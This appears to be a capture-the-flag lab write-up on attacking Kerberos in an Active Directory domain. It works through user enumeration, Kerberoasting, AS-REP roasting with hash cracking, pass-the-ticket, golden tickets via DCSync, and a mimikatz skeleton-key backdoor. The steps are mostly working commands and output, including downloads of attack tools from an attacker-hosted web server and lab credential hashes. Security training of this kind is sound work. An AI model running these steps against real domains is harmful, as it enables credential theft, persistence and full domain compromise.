---
render_with_liquid: false
title: Attacking Kerberos
---

﻿This room will cover all of the basics of attacking Kerberos the windows ticket-granting service; we'll cover the following:

- Initial enumeration using tools like Kerbrute and Rubeus
- Kerberoasting
- AS-REP Roasting with Rubeus and Impacket
- Golden/Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz




## What is Kerberos

**Common Terminology :**

- **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
- **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
- **Authentication Serv****ice (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
- **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.  
    
- **Service Principal Name (SPN)** - A Ser ice Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- **KDC Long Term Secret Key (KDC LT Key)** - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- **Client Long Term Secret Key (Client LT Key)** - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- **Service Long Term Secret Key (Service LT Key)** - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.


## Attack Privilege Requirements

- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required  
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required


## Questions


### What does TGT stand for?

> Ticket Granting Ticket


### What does SPN stand for?

> Service Principal Name


### What does PAC stand for?

> Privilege Attribute Certificate


### What two services make up the KDC?

> AS, TGS


# Enumeration w/ Kerbrute

Add domain to hosts

```bash
echo '10.10.230.35  CONTROLLER.local' | sudo tee -a /etc/hosts
```


## Abusing Pre-Authentication Overview -

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. 

When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.


## Enumerating Users w/ Kerbrute

Download wordlists

```bash
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
```

Use **kerbrute** userenum

```bash
kerbrute userenum -d CONTROLLER.local --dc CONTROLLER.local User.txt -t 100
```

```bash
2023/07/19 12:13:16 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2023/07/19 12:13:16 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2023/07/19 12:13:16 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2023/07/19 12:13:17 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2023/07/19 12:13:17 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2023/07/19 12:13:17 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2023/07/19 12:13:17 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2023/07/19 12:13:17 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2023/07/19 12:13:17 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2023/07/19 12:13:17 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2023/07/19 12:13:17 >  Done! Tested 100 usernames (10 valid) in 0.338 seconds
```


## Questions


### How many total users do we enumerate?

> 10 


### What is the SQL service account name?

> sqlservice


### What is the second "machine" account name?

> machine2


### What is the third "user" account name?

> user3


# Harvesting & Brute-Forcing Tickets w/ Rubeus


## Harvesting Tickets w/ Rubeus 

harvest for TGTs every 30 seconds

```bash
Rubeus.exe harvest /interval:30
```


## Brute-Forcing / Password-Spraying w/ Rubeus

Make sure domain controller domain name is in hosts

```bash
echo 10.10.230.35 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

take a given password and "spray" it against all found users then give the .kirbi TGT for that user 

```bash
Rubeus.exe brute /password:Password1 /noticket /nowrap
```


## Questions


### Which domain admin do we get a ticket for when harvesting tickets?

Host rubeus

```bash
mkdir www&&cd www
ln -s /opt/sectools/win/SharpCollection/NetFramework_4.7_Any/Rubeus.exe
python3 -m http.server 80
```

```bash
(new-object net.webclient).DownloadFile("http://10.11.19.145/Rubeus.exe", "C:\programdata\rubeus.exe")
C:\programdata\rubeus.exe harvest /interval:10 /nowrap
```

![](/assets/obsidian/61db9c99b7ff8f0ed8836302c4371ddf.png)

Administrator's ticket

![](/assets/obsidian/6a4cbbd813fe01d599d1013e26bbfb2a.png)

> Administrator


### Which domain controller do we get a ticket for when harvesting tickets?

> CONTROLLER-1


# Kerberoasting w/ Rubeus & Impacket


## Kerberoasting w/ Rubeus

```bash
Rubeus.exe kerberoast /outfile:ok
```

![](/assets/obsidian/82eb5972fd1b059afadee2a5fd120310.png)


## Kerberoasting w/ Impacket

```bash
GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.230.35 -request
```


## Crack The ticket hash

```bash
hashcat kerberoastables.txt Pass.txt -m 13100
```

```bash
┌──(kali㉿kali)-[~/thm/AttackingKerberos]
└─$ hashcat kerberoastables.txt Pass.txt -m 13100 --show
$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111@CONTROLLER.local*$cdde695c8caf3f28995a9f707460bb07$b1bbe699c17ae93c9b26c99a85005b657f22faf4d117beec64f66359ae3bced348b3a9b28abadf94f1e216e8eac02057782c7a72f2e894c6dcec916686c8ddf823d6fe5cbd3a4816f19e7ffccd076c300bf6cf5b72c19da9353b0bf283d05d9dddfe7ad497de9e57e764d33f53383e7a5eda81c1bf7a1cdc08c211b01a98f50a4881e4d4cdc35b05baf9a2b0fcfc026a642ed07cad96d0ccfe7047dc4aa64309eb92daa8faf2f52b09f918360d264ae7b5d6548f918f08e421714bfff6cd00ec52a16f2dd1212023daae24ad231a0164f5e41d534ce826e2531cf745def406a9cd4d84d4658b0e281bead8d0368318a3a3680bf1d333ddbb10d3ab978d68840777d48415b230833bddf3e36b399399edc8a330b6b0672d55cca18a47c239e362fbf82bfb012689c94ce4e6400d3d6662835fd37d128128abd59ba901fc235ee6053cc1d60bbcc7278008cfa79884160a86d86f8fdc73a90314e5852c0ce06fdc49d0a08488798bbdd1176a0accc7ee54f46cbae0e7b8c2cbe12c5198bfd9f8919c52cb0c6b5aa7d913092a683a0fc35a063c690252eabf1b77c39ff95e5807ab4e341ebd9b01c039755bd3815729b01069dfff940eee553f7c4c90116db3d8c4b5aef22a4f54471272a502777599aad42bf3cac732f7af701adecbdc34e56d21003bfab695cee1ef912b3eadc46d23e012462b48a0bd0e060ecd1866d32a010862a0f911551047c436cb9421f9fc066563c0515ade69819c67d15928b5ee603f45e1dcfa20482511dbf35fff93b7f4bea155357a6ec00b8689a2f6a0b1152251c5620d76e268cfba650ccdff80ada8e9e48ed5dbc92f610039d0c79faf4b182e8bc5253699e8b08947104443f0faf9c1bf4568d13450820523bc755b100f1c1fc521cc3550242db238dfff60f718faaf44eb6e86ebb064a0fe913bf46bad967e44e25d1baba6b0259a4d94d995f13643fde8ebfaf281c398127fd006317af5fb6b9c54dddf2fd2e803c15dbb640ac5dce07f86d9f3d00b497d4eb9e35ba6d46f921fbc0fe11fb6252f20b9d1933633a0485bd727e559d145d1e391ebe622503b9912480a1ea8d1eef114621f6ca1922335661e444033d9fc33073f610f03048ee1d3cf5085b7a3f22233c779856247c344c9b60332822e55b6e8da92fbcb2a10f414d35471391993d746029007db4659550260a28a1a1cdfb1cedb08ec43c6cacebc26bccfb69ef3681db7c323dd538021886e922b91c596f160037d467e3f3afa37fd9e8aa5b121256deded2985f68510aa0b15d6fafb2af3eabf43b2a52eb96d586d68e6377057c2ce1140a4cc3064c5bcad19caa2c0690b8a63264acbd1f29c16735225144f127736ed66d237c6214be08d28a0f5578971e7797c53c3195b923f97aee8e7618ce582cc38ff0b435a928c5749da6bbb4a6284658a15bcfc738939681c8872c193db5d12b86f0932b6dcc72842ff6df59fdfe8c510b4e67b32b98456d1206fc5e68db997607e5294a954d10748565a601385a163fdecdea7e17a327c1029d3610cde56dc7796734239951375fad8ad690e5b726561e8fb194d394984fb75f5037fa904b5086844ae571e263eb87eb3ef9c76069fe7cf92c48c4505dd9ada100f9ec37cd600d4a8f545:MYPassword123#
$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:30222@CONTROLLER.local*$edd42b613bcb248e7783d988a22b4576$fbede8a90768e43baa54d63fb572070cc05d866711c1c36a9a994ee0fa9b7f2aefd4d2232061bcceb381809c2616714fcb95a72925d0ac8efadea0a18c9680b8206076f91ae9ca76c03e0ac01193c51e9cb15a4ed17110ce8b136e8cdcf86f2d9234d210e836a7b0dab9b6b78ac4e489a879569c03d0e79d346db60c3ffd035184053a521c9dd17a1f880ded73e6544346d2508e7c395b87321eaf0b8e4920b4c440bd9a57df9ef7d5f934d21e3e662dfde898c15922493ed0d507fcb417fcaf8ce0ada43ef3c03228c97038892fca07be00d22e7264666839fdda290a904e73bcc1c43337465ae1c11291aa38711f009f34da0073328e88a8146371677e041451dd009c52162812eecc0c596052e11f80c0b132fb6b86e4c6f5b8589e0a4ffc54658bb992f98a2f90e78469a7cd5e153e067f83808ae5288a8a5906d2f4a905ddd3c60e5c9dd4c89594c4c34bac74321ea500c67e9254c7c6804819878d61154c192f06ca5edbc6c9cb2a329758a487cfdc39a9bb77473613a2d6dd4655eae7bd5a27b4e89b266aa4727db946df383eee88e7f59a54ec6f397fd9ddf84c058cd88927f7713d71f7ded285ba143ab7a2858f36b75afc93dacd6f050eec12adb89d5ebf36d9b7b538a3c287f6caf0ac729af5be0b52fb1fd1d1d01f9ab47a9a4dccb7bd8dad8de8a82b00ecac6b43ea4d84e9a6f741f89bf8f1fbdee103f5bb92d728f0511276753d3c4e3917f1b7a6555fb5a9980b03880c370ecb3551ed05c22633f15624b3bdc84bc2c50136919057912a1c382a8edbc64e714347ab2b484490cfaa165a6682541cdadcddfe2ed8dc8e1490d83eb888cb99a98460a760d4d314da4584351c26664f97a6c178344a8878c8edf3ba6e2125655df839f5e25395f1b3845e1d2c69009c070880f323edefda6dfae4e2cfd073390d299561fd7ad78f176b40d4606db75b5e92de5a25a685b77a5b268d9735c872d873cb34469866ac14146ab22bc5e0dc548533691b137d8c73100bd52776386f3f62b21a05e06870fc03c5ce7bf86d0aa3ee39ba97dd20a6be91adcea267fb2b4227c9b2fe7bea57af4b9a66c1655a2b07058cbeaccdb8483b1635e82458aa2c013875572e5c1a26a9208cb66855006ffc951882de2bbf470dce32b0ee31589a64a9d06ba8877d114b5f1cf0fbf19e358d1f48b39e129f96cc1214f4550a5d4f41bb9544d8baabcc69fe9252fc2e708899a7b6ab7206d5e33fc76cccac2127f981bf79c8c0d9bd7d40530e89039734b3da96bc2fb5e5e53ec43fbfbac0cbe92dbff13a6ab1e13ce3ceeb46f3e4718e0ed0e2b18a43e6e2b51ccca387004c1bcd4f26756e4fed9b1bede741be54d403ab4f5c42ab30aae699a1b01b2d1d92e2e7c6f431b495bfb610c12f147dab3006ad451e5651191a2fe8036bf53010deed58234dd77ad8891fc4d429fe671c7997ec884baf8fe839f7dcb4485b9f46d9c644a69ac0bae38035e8aee3b3e78c741eb214abf4eebfcd2fd1ce5d20bce8e23172de5157a0e89965d12c91ee77c93e1e1fd42cb885e6bcc0508aa6a78c33295791147fa359538b06d70f546b6e0e384fe8252b7f4756d112a55dcf993f8c827713ca0c307c43dc26b861f8ac2304fb0308b1f6a2eda087fc:Summer2020
```


## Questions


### What is the HTTPService Password?

> Summer2020


### What is the SQLService Password?

> MYPassword123#


# AS-REP Roasting w/ Rubeus


## Dumping KRBASREP5 Hashes w/ Rubeus

```bash
Rubeus.exe asreproast /format:hashcat /outfile:ok
```


## Asreproasting w/ CrackMapExec

```bash
cme ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```


## Crack The hash

```bash
vi asreproastables.txt
```

```bash
hashcat hash.txt Pass.txt -m 18200
```

```bash
$krb5asrep$23$User3@CONTROLLER.local:87e332d30212c599d7163b6f8aae5070$2ad92a417c3d8e902b6bbcade9c62dec648ffea274d7839e1a76c3409b4091a3890735f3915f88445e4beb7b672aae06e3b5696aec938655b759351caf311f642cfbfa9c312b8bf8ea51b5da7c21f2e1547309f0180fd1c1764c7d3cdaae464b470c9d6f9cc5f7991be3e043a7089f382be8828098fcfb7caf29e27682879d6707abc8d940be471eb00ceddd953dec92238441caa97728e49de7e130ed30476e385ba5181e7cccc8c7c0f07b72038a3b235436654fe6305ae8962f20698ba2ce25bbbdcd55973e9ab2a2fde4ec27b84742c4bb2d480830f3b47ca73d5d48725f166cd3509f50fa2f31829606550e57ae526ad8f8:Password3
$krb5asrep$23$Admin2@CONTROLLER.local:36be03e4ca6de109e476f722880a0692$c1c6cc69dcea88b1afaececef4c0e53d7aeb03961957d9b3ea474aa2bf5499f60d7fb3b64dfbfc102e9278d6fd7fabceaee794c8b9be4e7c9c3b1aa79a17996df7c0ea86a0cdafbcd412ecec69196edea7f9fd767dbf85811fbb81527ba10f148daaa3cf6e0dc5e7a1aae670fdb462d307ac0527bb1bb2b6a1b26163b6744615628d1dfedd058c4b6e9e8f1dbb566d90dbf3d7c38dff5f75f8d2c870424084018937b6a46f9de5b2dce0af20e0a1785009084e2f180941e23163b61d1b918c16861aece6ea2376b03280b085b66dd67dc9bd3099175f86732d22edc996ef70ace7eee33e1f7dd58eeb0aea71db75d8854538839e:P@$$W0rd2

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: asreproastables.txt
Time.Started.....: Wed Jul 19 12:52:44 2023 (0 secs)
Time.Estimated...: Wed Jul 19 12:52:44 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Pass.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   480.9 kH/s (0.51ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
Progress.........: 2480/2480 (100.00%)
Rejected.........: 0/2480 (0.00%)
Restore.Point....: 0/1240 (0.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hello123
Hardware.Mon.#1..: Util:  6%

Started: Wed Jul 19 12:52:32 2023
Stopped: Wed Jul 19 12:52:45 2023
```


### What hash type does AS-REP Roasting use?

> Kerberos 5, etype 23, AS-REP


### Which User is vulnerable to AS-REP Roasting?

> Password3


### What is the User's Password?

> Password3


### Which Admin is vulnerable to AS-REP Roasting?

> Admin2


### What is the Admin's Password?

> `P@$$W0rd2`


# Pass the Ticket w/ mimikatz

Host mimikatz

```bash
mkdir www&&cd www
ln -s /opt/sectools/win/windows-resources/mimikatz/x64/mimikatz.exe
python3 -m http.server 80
```

```bash
(new-object net.webclient).DownloadFile("http://10.11.19.145/mimikatz.exe", "C:\programdata\mimikatz.exe")
```


## Dump Tickets w/ Mimikatz

```bash
.\mimikatz 'sekurlsa::tickets /export' 'exit'
```

![](/assets/obsidian/2ddc3f902cc430041f53d4be64933998.png)

![](/assets/obsidian/2903b07eae4f2d32cf056851eb173fa1.png)


## Pass the Ticket w/ Mimikatz

```bash
PS C:\ProgramData> .\mimikatz 'kerberos::ptt [0;2c728d]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi' 'exit'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::ptt [0;2c728d]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi

* File: '[0;2c728d]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK

mimikatz(commandline) # exit
Bye!
PS C:\ProgramData> klist

Current LogonId is 0:0x2c728d

Cached Tickets: (2)


#0>     Client: Administrator @ CONTROLLER.LOCAL
        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 7/18/2023 21:55:40 (local)
        End Time:   7/19/2023 7:55:40 (local)
        Renew Time: 7/25/2023 21:55:40 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:


#1>     Client: Administrator @ CONTROLLER.LOCAL
        Server: host/controller-1.controller.local @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 7/18/2023 21:55:40 (local)
        End Time:   7/19/2023 7:55:40 (local)
        Renew Time: 7/25/2023 21:55:40 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: CONTROLLER-1
```


# Golden/Silver Ticket Attacks w/ mimikatz


## get krbtgt hash with DCSync

```bash
.\mimikatz.exe 'lsadump::dcsync /user:krbtgt' exit
```

![](/assets/obsidian/b6bbe6c6a25ecb7056eb160e5edd2135.png)


## Create a Golden/Silver Ticket and inject

```bash
.\mimikatz.exe 'kerberos::golden /domain:CONTROLLER.local /sid:S-1-5-21-432953485-3795405108-1502158860 /aes256:dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033 /user:Administrator /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt' exit
```

![](/assets/obsidian/e86e5ff412f8b8a95c7360dbf8ae242c.png)

Check the injected ticket

```bash
PS C:\ProgramData> klist
Current LogonId is 0:0x2c728d
Cached Tickets: (1)


#0>     Client: Administrator @ CONTROLLER.local
        Server: krbtgt/CONTROLLER.local @ CONTROLLER.local
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 7/18/2023 22:24:50 (local)
        End Time:   7/19/2023 8:24:50 (local)
        Renew Time: 7/25/2023 22:24:50 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```


## Use the Golden/Silver Ticket to access other machines

```bash
dir \\Desktop-1\C$
```


## Questiosn


### What is the SQLService NTLM Hash?

```bash
.\mimikatz.exe 'lsadump::dcsync /user:SQLService' exit
```

> cd40c9ed96265531b21fc5b1dafcfb0a


### What is the Administrator NTLM Hash?

```bash
.\mimikatz.exe 'lsadump::dcsync /user:Administrator' exit
```

> 2777b7fec870e04dda00cd7260f7bee6


## Kerberos Backdoors w/ mimikatz


## Installing the Skeleton Key w/ mimikatz

> https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton

```bash
.\mimikatz.exe 'misc::skeleton' exit
```

![](/assets/obsidian/5e2f6cab611cffd27f8ca4cc350eba5f.png)


## Accessing the forest 

The default credentials will be: "mimikatz"

Ex:

-  `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password

-  `dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1